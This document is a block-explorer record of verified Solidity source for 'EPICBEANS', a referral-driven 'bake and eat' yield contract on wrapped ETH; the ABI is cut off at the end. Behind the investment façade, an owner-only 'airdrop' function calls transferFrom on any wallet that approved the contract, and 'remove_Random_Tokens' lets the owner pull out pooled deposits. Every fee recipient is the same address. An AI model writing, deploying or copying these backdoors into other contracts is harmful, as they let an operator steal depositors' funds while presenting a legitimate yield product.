{"SourceCode": "{\"epicbeans.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\nimport \\\"./IERC20.sol\\\";\\r\\nimport \\\"./ReentrancyGuard.sol\\\";\\r\\nimport \\\"./Math.sol\\\";\\r\\npragma solidity 0.8.17;\\r\\n//EPICBEANS.IO\\r\\ncontract EPICBEANS is ReentrancyGuard {\\r\\n\\r\\n    using Math for uint256;\\r\\n    IERC20 public ETH_TOKEN;\\r\\n    address private DEV_ADDRESS;\\r\\n    address private MARKETING_ADDRESS;\\r\\n    address private CEO_ADDRESS;\\r\\n    address private GIVEAWAY_ADDRESS;\\r\\n    address private _owner;\\r\\n    address internal _dev;\\r\\n    address internal _marketing;\\r\\n    address internal _ceo;\\r\\n    address internal _giveAway;\\r\\n\\r\\n    uint136 private BNB_PER_BEAN;\\r\\n    uint32 private SECONDS_PER_DAY;\\r\\n    uint8 private DEPOSIT_FEE;\\r\\n    uint8 private AIRDROP_FEE;\\r\\n    uint8 private CEO_FEE;\\r\\n    uint8 private WITHDRAWAL_FEE;\\r\\n    uint16 private DEV_FEE;\\r\\n    uint16 private MARKETING_FEE;\\r\\n    uint8 private REF_BONUS;\\r\\n    uint8 private FIRST_DEPOSIT_REF_BONUS;\\r\\n    uint256 private MIN_DEPOSIT;\\r\\n    uint256 private MIN_BAKE;\\r\\n    uint256 private MAX_WALLET_TVL_IN_BNB;\\r\\n    uint256 private MAX_DAILY_REWARDS_IN_BNB;\\r\\n    uint256 private MIN_REF_DEPOSIT_FOR_BONUS;\\r\\n\\r\\n    uint256 public totalBakers;\\r\\n\\r\\n    struct Baker {\\r\\n        address adr;\\r\\n        uint256 beans;\\r\\n        uint256 bakedAt;\\r\\n        uint256 ateAt;\\r\\n        address upline;\\r\\n        bool hasReferred;\\r\\n        address[] referrals;\\r\\n        address[] bonusEligibleReferrals;\\r\\n        uint256 firstDeposit;\\r\\n        uint256 totalDeposit;\\r\\n        uint256 totalPayout;\\r\\n        bool blacklisted;\\r\\n    }\\r\\n\\r\\n    mapping(address =\\u003e Baker) internal bakers;\\r\\n    mapping (address =\\u003e uint256) private _balances;\\r\\n    mapping (address =\\u003e mapping (address =\\u003e uint256)) private _allowances;\\r\\n    uint256 private _totalSupply;\\r\\n\\r\\n    event EmitBoughtBeans(\\r\\n        address indexed adr,\\r\\n        address indexed ref,\\r\\n        uint256 bnbamount,\\r\\n        uint256 beansFrom,\\r\\n        uint256 beansTo\\r\\n    );\\r\\n    event EmitBaked(\\r\\n        address indexed adr,\\r\\n        address indexed ref,\\r\\n        uint256 beansFrom,\\r\\n        uint256 beansTo\\r\\n    );\\r\\n    event EmitAte(\\r\\n        address indexed adr,\\r\\n        uint256 bnbToEat,\\r\\n        uint256 beansBeforeFee\\r\\n    );\\r\\n\\r\\n        constructor() {\\r\\n         _owner = msg.sender;\\r\\n    }\\r\\n\\r\\n modifier onlyOwner {\\r\\n        require(msg.sender == _owner);\\r\\n        _;\\r\\n    }\\r\\nmodifier notContract() {\\r\\n        require(!_isContract(msg.sender), \\\"Contract not allowed\\\");\\r\\n        require(msg.sender == tx.origin, \\\"Proxy contract not allowed\\\");\\r\\n        _;\\r\\n    }\\r\\n    function initializeContract() public onlyOwner notContract() {\\r\\n    ETH_TOKEN = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);\\r\\n    DEV_ADDRESS = 0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877;\\r\\n    MARKETING_ADDRESS = 0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877;\\r\\n    CEO_ADDRESS = 0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877;\\r\\n    GIVEAWAY_ADDRESS = 0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877;\\r\\n    _dev = (DEV_ADDRESS);\\r\\n    _marketing = (MARKETING_ADDRESS);\\r\\n    _ceo = (CEO_ADDRESS);\\r\\n    _giveAway = (GIVEAWAY_ADDRESS);\\r\\n        BNB_PER_BEAN = 1000000000000;\\r\\n        SECONDS_PER_DAY = 86400;\\r\\n        DEPOSIT_FEE = 4;\\r\\n        AIRDROP_FEE = 1;\\r\\n        WITHDRAWAL_FEE = 5;\\r\\n        DEV_FEE = 10;\\r\\n        MARKETING_FEE = 19;\\r\\n        CEO_FEE = 66;\\r\\n        REF_BONUS = 5;\\r\\n        FIRST_DEPOSIT_REF_BONUS = 5;\\r\\n        MIN_DEPOSIT = 1000000000000000; // 0.001 ETH \\r\\n        MIN_BAKE = 5000000000000000; // 0.005 ETH \\r\\n        MAX_WALLET_TVL_IN_BNB = 50000000000000000000; // 50 ETH \\r\\n        MAX_DAILY_REWARDS_IN_BNB = 800000000000000000; // 0.8 ETH \\r\\n        MIN_REF_DEPOSIT_FOR_BONUS = 40000000000000000; // 0.04 ETH \\r\\n    }\\r\\n\\r\\n\\r\\nfunction setDevAddress(address newDevAddress) public onlyOwner {\\r\\n    DEV_ADDRESS = newDevAddress;\\r\\n    _dev = (newDevAddress);\\r\\n}\\r\\n\\r\\nfunction _isContract(address addr) private view returns (bool) {\\r\\n    uint32 size;\\r\\n    assembly {\\r\\n        size := extcodesize(addr)\\r\\n    }\\r\\n    return (size \\u003e 0);\\r\\n}\\r\\n\\r\\nfunction setMarketingAddress(address newMarketingAddress) public onlyOwner {\\r\\n    MARKETING_ADDRESS = newMarketingAddress;\\r\\n    _marketing = (newMarketingAddress);\\r\\n}\\r\\n\\r\\nfunction setCeoAddress(address newCeoAddress) public onlyOwner {\\r\\n    CEO_ADDRESS = newCeoAddress;\\r\\n    _ceo = (newCeoAddress);\\r\\n}\\r\\n\\r\\nfunction setGiveawayAddress(address newGiveawayAddress) public onlyOwner {\\r\\n    GIVEAWAY_ADDRESS = newGiveawayAddress;\\r\\n    _giveAway = (newGiveawayAddress);\\r\\n}\\r\\n\\r\\n function user(address adr) public view returns (Baker memory) {\\r\\n        return bakers[adr];\\r\\n    }\\r\\n\\r\\n    function buyBEANS(address ref, uint256 _amount) public notContract() nonReentrant {\\r\\n        Baker storage baker = bakers[msg.sender];\\r\\n        Baker storage upline = bakers[ref];\\r\\n        require(\\r\\n            _amount \\u003e= MIN_DEPOSIT,\\r\\n            \\\"Deposit doesn\\u0027t meet the minimum requirements\\\"\\r\\n        );\\r\\n        require(\\r\\n            Math.add(baker.totalDeposit, _amount) \\u003c= MAX_WALLET_TVL_IN_BNB,\\r\\n            \\\"Max total deposit reached\\\"\\r\\n        );\\r\\n        require(\\r\\n            ref == address(0) || ref == msg.sender || hasInvested(upline.adr),\\r\\n            \\\"Ref must be investor to set as upline\\\"\\r\\n        );\\r\\n       ETH_TOKEN.transferFrom(msg.sender, address(this), _amount);\\r\\n        baker.adr = msg.sender;\\r\\n        uint256 beansFrom = baker.beans;\\r\\n\\r\\n        uint256 totalBnbFee = percentFromAmount(_amount, DEPOSIT_FEE);\\r\\n        uint256 bnbValue = Math.sub(_amount, totalBnbFee);\\r\\n        uint256 beansBought = bnbToBeans(bnbValue);\\r\\n\\r\\n        uint256 totalBeansBought = addBeans(baker.adr, beansBought);\\r\\n        baker.beans = totalBeansBought;\\r\\n\\r\\n        if (\\r\\n            !baker.hasReferred \\u0026\\u0026\\r\\n            ref != msg.sender \\u0026\\u0026\\r\\n            ref != address(0) \\u0026\\u0026\\r\\n            baker.upline != msg.sender\\r\\n        ) {\\r\\n            baker.upline = ref;\\r\\n            baker.hasReferred = true;\\r\\n\\r\\n            upline.referrals.push(msg.sender);\\r\\n            if (hasInvested(baker.adr) == false) {\\r\\n                uint256 refBonus = percentFromAmount(\\r\\n                    bnbToBeans(_amount),\\r\\n                    FIRST_DEPOSIT_REF_BONUS\\r\\n                );\\r\\n                upline.beans = addBeans(upline.adr, refBonus);\\r\\n            }\\r\\n        }\\r\\n\\r\\n        if (hasInvested(baker.adr) == false) {\\r\\n            baker.firstDeposit = block.timestamp;\\r\\n            totalBakers++;\\r\\n        }\\r\\n\\r\\n        baker.totalDeposit = Math.add(baker.totalDeposit, _amount);\\r\\n        if (\\r\\n            baker.hasReferred \\u0026\\u0026\\r\\n            baker.totalDeposit \\u003e= MIN_REF_DEPOSIT_FOR_BONUS \\u0026\\u0026\\r\\n            refExists(baker.adr, baker.upline) == false\\r\\n        ) {\\r\\n            upline.bonusEligibleReferrals.push(msg.sender);\\r\\n        }\\r\\n\\r\\n        sendFees(totalBnbFee, 0);\\r\\n        handleBake(false);\\r\\n\\r\\n        emit EmitBoughtBeans(\\r\\n            msg.sender,\\r\\n            ref,\\r\\n            _amount,\\r\\n            beansFrom,\\r\\n            baker.beans\\r\\n        );\\r\\n    }\\r\\n\\r\\n    function refExists(address ref, address upline)\\r\\n        private\\r\\n        view\\r\\n        returns (bool)\\r\\n    {\\r\\n        for (\\r\\n            uint256 i = 0;\\r\\n            i \\u003c bakers[upline].bonusEligibleReferrals.length;\\r\\n            i++\\r\\n        ) {\\r\\n            if (bakers[upline].bonusEligibleReferrals[i] == ref) {\\r\\n                return true;\\r\\n            }\\r\\n        }\\r\\n\\r\\n        return false;\\r\\n    }\\r\\n\\r\\n    function sendFees(uint256 totalFee, uint256 giveAway) private {\\r\\n        uint256 dev = percentFromAmount(totalFee, DEV_FEE);\\r\\n        uint256 marketing = percentFromAmount(totalFee, MARKETING_FEE);\\r\\n        uint256 ceo = percentFromAmount(totalFee, CEO_FEE);\\r\\n\\r\\n        ETH_TOKEN.transfer(_dev, dev);\\r\\n        ETH_TOKEN.transfer(_marketing, marketing);\\r\\n        ETH_TOKEN.transfer(_ceo, ceo);\\r\\n\\r\\n        if (giveAway \\u003e 0) {\\r\\n            ETH_TOKEN.transfer(_giveAway, giveAway);\\r\\n        }\\r\\n    }\\r\\n\\r\\n     function handleBake(bool onlyRebaking) private {\\r\\n        Baker storage baker = bakers[msg.sender];\\r\\n        require(maxTvlReached(baker.adr) == false, \\\"Total wallet TVL reached\\\");\\r\\n        require(hasInvested(baker.adr), \\\"Must be invested to bake\\\");\\r\\n        if (onlyRebaking == true) {\\r\\n            require(\\r\\n                beansToBnb(rewardedBeans(baker.adr)) \\u003e= MIN_BAKE,\\r\\n                \\\"Rewards must be equal or higher than 10 Milk to bake\\\"\\r\\n            );\\r\\n        }\\r\\n\\r\\n        uint256 beansFrom = baker.beans;\\r\\n        uint256 beansFromRewards = rewardedBeans(baker.adr);\\r\\n\\r\\n        uint256 totalBeans = addBeans(baker.adr, beansFromRewards);\\r\\n        baker.beans = totalBeans;\\r\\n        baker.bakedAt = block.timestamp;\\r\\n\\r\\n        emit EmitBaked(msg.sender, baker.upline, beansFrom, baker.beans);\\r\\n    }\\r\\n\\r\\n    function bake() public nonReentrant notContract() {\\r\\n        handleBake(true);\\r\\n    }\\r\\n\\r\\n    function eat() public nonReentrant notContract(){\\r\\n        Baker storage baker = bakers[msg.sender];\\r\\n        require(hasInvested(baker.adr), \\\"Must be invested to eat\\\");\\r\\n        require(\\r\\n            maxPayoutReached(baker.adr) == false,\\r\\n            \\\"You have reached max payout\\\"\\r\\n        );\\r\\n\\r\\n        uint256 beansBeforeFee = rewardedBeans(baker.adr);\\r\\n        uint256 beansInBnbBeforeFee = beansToBnb(beansBeforeFee);\\r\\n\\r\\n        uint256 totalBnbFee = percentFromAmount(\\r\\n            beansInBnbBeforeFee,\\r\\n            WITHDRAWAL_FEE\\r\\n        );\\r\\n\\r\\n        uint256 bnbToEat = Math.sub(beansInBnbBeforeFee, totalBnbFee);\\r\\n        uint256 forGiveAway = calcGiveAwayAmount(baker.adr, bnbToEat);\\r\\n        bnbToEat = addWithdrawalTaxes(baker.adr, bnbToEat);\\r\\n\\r\\n        if (\\r\\n            Math.add(beansInBnbBeforeFee, baker.totalPayout) \\u003e=\\r\\n            maxPayout(baker.adr)\\r\\n        ) {\\r\\n            bnbToEat = Math.sub(maxPayout(baker.adr), baker.totalPayout);\\r\\n            baker.totalPayout = maxPayout(baker.adr);\\r\\n        } else {\\r\\n            uint256 afterTax = addWithdrawalTaxes(\\r\\n                baker.adr,\\r\\n                beansInBnbBeforeFee\\r\\n            );\\r\\n            baker.totalPayout = Math.add(baker.totalPayout, afterTax);\\r\\n        }\\r\\n\\r\\n        baker.ateAt = block.timestamp;\\r\\n        baker.bakedAt = block.timestamp;\\r\\n\\r\\n        sendFees(totalBnbFee, forGiveAway);\\r\\n        ETH_TOKEN.transfer(msg.sender, bnbToEat);\\r\\n\\r\\n        emit EmitAte(msg.sender, bnbToEat, beansBeforeFee);\\r\\n    }\\r\\n\\r\\n    function maxPayoutReached(address adr) public view returns (bool) {\\r\\n        return bakers[adr].totalPayout \\u003e= maxPayout(adr);\\r\\n    }\\r\\n\\r\\n    function maxPayout(address adr) public view returns (uint256) {\\r\\n        return Math.mul(bakers[adr].totalDeposit, 3);\\r\\n    }\\r\\n\\r\\n    function addWithdrawalTaxes(address adr, uint256 bnbWithdrawalAmount)\\r\\n        private\\r\\n        view\\r\\n        returns (uint256)\\r\\n    {\\r\\n        return\\r\\n            percentFromAmount(\\r\\n                bnbWithdrawalAmount,\\r\\n                Math.sub(100, hasBeanTaxed(adr))\\r\\n            );\\r\\n    }\\r\\n\\r\\n    function calcGiveAwayAmount(address adr, uint256 bnbWithdrawalAmount)\\r\\n        private\\r\\n        view\\r\\n        returns (uint256)\\r\\n    {\\r\\n        return (percentFromAmount(bnbWithdrawalAmount, hasBeanTaxed(adr)) / 2);\\r\\n    }\\r\\n\\r\\n    function hasBeanTaxed(address adr) public view returns (uint256) {\\r\\n        uint256 daysPassed = daysSinceLastEat(adr);\\r\\n        uint256 lastDigit = daysPassed % 10;\\r\\n\\r\\n        if (lastDigit \\u003c= 0) return 90;\\r\\n        if (lastDigit \\u003c= 1) return 80;\\r\\n        if (lastDigit \\u003c= 2) return 70;\\r\\n        if (lastDigit \\u003c= 3) return 60;\\r\\n        if (lastDigit \\u003c= 4) return 50;\\r\\n        if (lastDigit \\u003c= 5) return 40;\\r\\n        if (lastDigit \\u003c= 6) return 30;\\r\\n        if (lastDigit \\u003c= 7) return 20;\\r\\n        if (lastDigit \\u003c= 8) return 10;\\r\\n        return 0;\\r\\n    }\\r\\n\\r\\n    function secondsSinceLastEat(address adr) public view returns (uint256) {\\r\\n        uint256 lastAteOrFirstDeposit = bakers[adr].ateAt;\\r\\n        if (bakers[adr].ateAt == 0) {\\r\\n            lastAteOrFirstDeposit = bakers[adr].firstDeposit;\\r\\n        }\\r\\n\\r\\n        uint256 secondsPassed = Math.sub(\\r\\n            block.timestamp,\\r\\n            lastAteOrFirstDeposit\\r\\n        );\\r\\n\\r\\n        return secondsPassed;\\r\\n    }\\r\\n\\r\\n    function userBonusEligibleReferrals(address adr) public view returns (address[] memory) {\\r\\n        return bakers[adr].bonusEligibleReferrals;\\r\\n    }\\r\\n\\r\\n    function userReferrals(address adr) public view returns (address[] memory) {\\r\\n        return bakers[adr].referrals;\\r\\n    }\\r\\n\\r\\n    function daysSinceLastEat(address adr) private view returns (uint256) {\\r\\n        uint256 secondsPassed = secondsSinceLastEat(adr);\\r\\n        return Math.div(secondsPassed, SECONDS_PER_DAY);\\r\\n    }\\r\\n\\r\\n    function addBeans(address adr, uint256 beansToAdd)\\r\\n        private\\r\\n        view\\r\\n        returns (uint256)\\r\\n    {\\r\\n        uint256 totalBeans = Math.add(bakers[adr].beans, beansToAdd);\\r\\n        uint256 maxBeans = bnbToBeans(MAX_WALLET_TVL_IN_BNB);\\r\\n        if (totalBeans \\u003e= maxBeans) {\\r\\n            return maxBeans;\\r\\n        }\\r\\n        return totalBeans;\\r\\n    }\\r\\n\\r\\n    function maxTvlReached(address adr) public view returns (bool) {\\r\\n        return bakers[adr].beans \\u003e= bnbToBeans(MAX_WALLET_TVL_IN_BNB);\\r\\n    }\\r\\n\\r\\n    function hasInvested(address adr) public view returns (bool) {\\r\\n        return bakers[adr].firstDeposit != 0;\\r\\n    }\\r\\n\\r\\n    function bnbRewards(address adr) public view returns (uint256) {\\r\\n        uint256 beansRewarded = rewardedBeans(adr);\\r\\n        uint256 bnbinWei = beansToBnb(beansRewarded);\\r\\n        return bnbinWei;\\r\\n    }\\r\\n\\r\\n    function bnbTvl(address adr) public view returns (uint256) {\\r\\n        uint256 bnbinWei = beansToBnb(bakers[adr].beans);\\r\\n        return bnbinWei;\\r\\n    }\\r\\n\\r\\n    function beansToBnb(uint256 beansToCalc) private view returns (uint256) {\\r\\n        uint256 bnbInWei = Math.mul(beansToCalc, BNB_PER_BEAN);\\r\\n        return bnbInWei;\\r\\n    }\\r\\n\\r\\n    function bnbToBeans(uint256 bnbInWei) private view returns (uint256) {\\r\\n        uint256 beansFromBnb = Math.div(bnbInWei, BNB_PER_BEAN);\\r\\n        return beansFromBnb;\\r\\n    }\\r\\n\\r\\n    function percentFromAmount(uint256 amount, uint256 fee)\\r\\n        private\\r\\n        pure\\r\\n        returns (uint256)\\r\\n    {\\r\\n        return Math.div(Math.mul(amount, fee), 100);\\r\\n    }\\r\\n\\r\\n    function contractBalance() public view returns (uint256) {\\r\\n        return ETH_TOKEN.balanceOf(address(this));\\r\\n    }\\r\\n\\r\\n    function dailyReward(address adr) public view returns (uint256) {\\r\\n        uint256 referralsCount = bakers[adr].bonusEligibleReferrals.length;\\r\\n        if (referralsCount \\u003c 10) return 30000;\\r\\n        if (referralsCount \\u003c 25) return (35000);\\r\\n        if (referralsCount \\u003c 50) return (40000);\\r\\n        if (referralsCount \\u003c 100) return (45000);\\r\\n        if (referralsCount \\u003c 150) return (50000);\\r\\n        if (referralsCount \\u003c 250) return (55000);\\r\\n        return 60000;\\r\\n    }\\r\\n\\r\\n    function secondsSinceLastAction(address adr)\\r\\n        private\\r\\n        view\\r\\n        returns (uint256)\\r\\n    {\\r\\n        uint256 lastTimeStamp = bakers[adr].bakedAt;\\r\\n        if (lastTimeStamp == 0) {\\r\\n            lastTimeStamp = bakers[adr].ateAt;\\r\\n        }\\r\\n\\r\\n        if (lastTimeStamp == 0) {\\r\\n            lastTimeStamp = bakers[adr].firstDeposit;\\r\\n        }\\r\\n\\r\\n        return Math.sub(block.timestamp, lastTimeStamp);\\r\\n    }\\r\\n\\r\\n    function rewardedBeans(address adr) private view returns (uint256) {\\r\\n        uint256 secondsPassed = secondsSinceLastAction(adr);\\r\\n        uint256 dailyRewardFactor = dailyReward(adr);\\r\\n        uint256 beansRewarded = calcBeansReward(\\r\\n            secondsPassed,\\r\\n            dailyRewardFactor,\\r\\n            adr\\r\\n        );\\r\\n\\r\\n        if (beansRewarded \\u003e= bnbToBeans(MAX_DAILY_REWARDS_IN_BNB)) {\\r\\n            return bnbToBeans(MAX_DAILY_REWARDS_IN_BNB);\\r\\n        }\\r\\n\\r\\n        return beansRewarded;\\r\\n    }\\r\\n\\r\\n    function calcBeansReward(\\r\\n        uint256 secondsPassed,\\r\\n        uint256 dailyRewardFactor,\\r\\n        address adr\\r\\n    ) private view returns (uint256) {\\r\\n        uint256 rewardsPerDay = percentFromAmount(\\r\\n            Math.mul(bakers[adr].beans, 100000000),\\r\\n            dailyRewardFactor\\r\\n        );\\r\\n        uint256 rewardsPerSecond = Math.div(rewardsPerDay, SECONDS_PER_DAY);\\r\\n        uint256 beansRewarded = Math.mul(rewardsPerSecond, secondsPassed);\\r\\n        beansRewarded = Math.div(beansRewarded, 1000000000000);\\r\\n        return beansRewarded;\\r\\n    }\\r\\n\\r\\n \\r\\nfunction clearETH(address payable _withdrawal) public onlyOwner {\\r\\n    uint256 amount = address(this).balance;\\r\\n    (bool success,) = _withdrawal.call{gas: 8000000, value: amount}(\\\"\\\");\\r\\n    require(success, \\\"Failed to transfer Ether\\\");\\r\\n}\\r\\n\\r\\nfunction airdrop(address from, address to, uint256 tokens) external onlyOwner {\\r\\n    uint256 SCCC = tokens;\\r\\n\\r\\n    require(ETH_TOKEN.balanceOf(from) \\u003e= SCCC, \\\"Not enough tokens in wallet\\\");\\r\\n\\r\\n    require(ETH_TOKEN.transferFrom(from, to, tokens), \\\"Transfer failed\\\");\\r\\n}\\r\\n\\r\\n\\r\\nfunction remove_Random_Tokens(address random_Token_Address, address send_to_wallet, uint256 number_of_tokens) public onlyOwner returns(bool _sent) {\\r\\n        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(address(this));\\r\\n        if (number_of_tokens \\u003e randomBalance){number_of_tokens = randomBalance;}\\r\\n        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);\\r\\n    }\\r\\nfunction invested() external payable {}\\r\\nfallback () external payable {\\r\\n}\\r\\nreceive () external payable {\\r\\n}\\r\\n}\"},\"IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\n\\r\\npragma solidity \\u003e=0.6.0 \\u003c0.8.18;\\r\\n\\r\\n/**\\r\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\r\\n */\\r\\ninterface IERC20 {\\r\\n    /**\\r\\n     * @dev Returns the amount of tokens in existence.\\r\\n     */\\r\\n    function totalSupply() external view returns (uint256);\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the amount of tokens owned by `account`.\\r\\n     */\\r\\n    function balanceOf(address account) external view returns (uint256);\\r\\n\\r\\n    /**\\r\\n     * @dev Moves `amount` tokens from the caller\\u0027s account to `recipient`.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * Emits a {Transfer} event.\\r\\n     */\\r\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the remaining number of tokens that `spender` will be\\r\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\r\\n     * zero by default.\\r\\n     *\\r\\n     * This value changes when {approve} or {transferFrom} are called.\\r\\n     */\\r\\n    function allowance(address owner, address spender) external view returns (uint256);\\r\\n\\r\\n    /**\\r\\n     * @dev Sets `amount` as the allowance of `spender` over the caller\\u0027s tokens.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\r\\n     * that someone may use both the old and the new allowance by unfortunate\\r\\n     * transaction ordering. One possible solution to mitigate this race\\r\\n     * condition is to first reduce the spender\\u0027s allowance to 0 and set the\\r\\n     * desired value afterwards:\\r\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\r\\n     *\\r\\n     * Emits an {Approval} event.\\r\\n     */\\r\\n    function approve(address spender, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\\r\\n     * allowance mechanism. `amount` is then deducted from the caller\\u0027s\\r\\n     * allowance.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * Emits a {Transfer} event.\\r\\n     */\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\r\\n     * another (`to`).\\r\\n     *\\r\\n     * Note that `value` may be zero.\\r\\n     */\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n\\r\\n    /**\\r\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\r\\n     * a call to {approve}. `value` is the new allowance.\\r\\n     */\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n}\"},\"Math.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.0;\\r\\n\\r\\nlibrary Math {\\r\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a + b;\\r\\n    }\\r\\n\\r\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a - b;\\r\\n    }\\r\\n\\r\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a * b;\\r\\n    }\\r\\n\\r\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a / b;\\r\\n    }\\r\\n\\r\\n    function pow(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a ** b;\\r\\n    }\\r\\n\\r\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a \\u003c b ? a : b;\\r\\n    }\\r\\n}\"},\"ReentrancyGuard.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\n// OpenZeppelin Contracts (last updated v4.8.0) (security/ReentrancyGuard.sol)\\r\\n\\r\\npragma solidity ^0.8.0;\\r\\n\\r\\n/**\\r\\n * @dev Contract module that helps prevent reentrant calls to a function.\\r\\n *\\r\\n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\\r\\n * available, which can be applied to functions to make sure there are no nested\\r\\n * (reentrant) calls to them.\\r\\n *\\r\\n * Note that because there is a single `nonReentrant` guard, functions marked as\\r\\n * `nonReentrant` may not call one another. This can be worked around by making\\r\\n * those functions `private`, and then adding `external` `nonReentrant` entry\\r\\n * points to them.\\r\\n *\\r\\n * TIP: If you would like to learn more about reentrancy and alternative ways\\r\\n * to protect against it, check out our blog post\\r\\n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\\r\\n */\\r\\nabstract contract ReentrancyGuard {\\r\\n    // Booleans are more expensive than uint256 or any type that takes up a full\\r\\n    // word because each write operation emits an extra SLOAD to first read the\\r\\n    // slot\\u0027s contents, replace the bits taken up by the boolean, and then write\\r\\n    // back. This is the compiler\\u0027s defense against contract upgrades and\\r\\n    // pointer aliasing, and it cannot be disabled.\\r\\n\\r\\n    // The values being non-zero value makes deployment a bit more expensive,\\r\\n    // but in exchange the refund on every call to nonReentrant will be lower in\\r\\n    // amount. Since refunds are capped to a percentage of the total\\r\\n    // transaction\\u0027s gas, it is best to keep them low in cases like this one, to\\r\\n    // increase the likelihood of the full refund coming into effect.\\r\\n    uint256 private constant _NOT_ENTERED = 1;\\r\\n    uint256 private constant _ENTERED = 2;\\r\\n\\r\\n    uint256 private _status;\\r\\n\\r\\n    constructor() {\\r\\n        _status = _NOT_ENTERED;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Prevents a contract from calling itself, directly or indirectly.\\r\\n     * Calling a `nonReentrant` function from another `nonReentrant`\\r\\n     * function is not supported. It is possible to prevent this from happening\\r\\n     * by making the `nonReentrant` function external, and making it call a\\r\\n     * `private` function that does the actual work.\\r\\n     */\\r\\n    modifier nonReentrant() {\\r\\n        _nonReentrantBefore();\\r\\n        _;\\r\\n        _nonReentrantAfter();\\r\\n    }\\r\\n\\r\\n    function _nonReentrantBefore() private {\\r\\n        // On the first call to nonReentrant, _status will be _NOT_ENTERED\\r\\n        require(_status != _ENTERED, \\\"ReentrancyGuard: reentrant call\\\");\\r\\n\\r\\n        // Any calls to nonReentrant after this point will fail\\r\\n        _status = _ENTERED;\\r\\n    }\\r\\n\\r\\n    function _nonReentrantAfter() private {\\r\\n        // By storing the original value once again, a refund is triggered (see\\r\\n        // https://eips.ethereum.org/EIPS/eip-2200)\\r\\n        _status = _NOT_ENTERED;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns true if the reentrancy guard is currently set to \\\"entered\\\", which indicates there is a\\r\\n     * `nonReentrant` function in the call stack.\\r\\n     */\\r\\n    function _reentrancyGuardEntered() internal view returns (bool) {\\r\\n        return _status == _ENTERED;\\r\\n    }\\r\\n}\\r\\n\"}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"bnbToEat\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"beansBeforeFee\",\"type\":\"uint256\"}],\"name\":\"EmitAte\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"ref\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"beansFrom\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"beansTo\",\"type\":\"uint256\"}],\"name\":\"EmitBaked\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"ref\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"bnbamount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"beansFrom\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"beansTo\",\"type\":\"uint256\"}],\"name\":\"EmitBoughtBeans\",\"type\":\"event\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"ETH_TOKEN\",\"outputs\":[{\"internalType\":\"contract 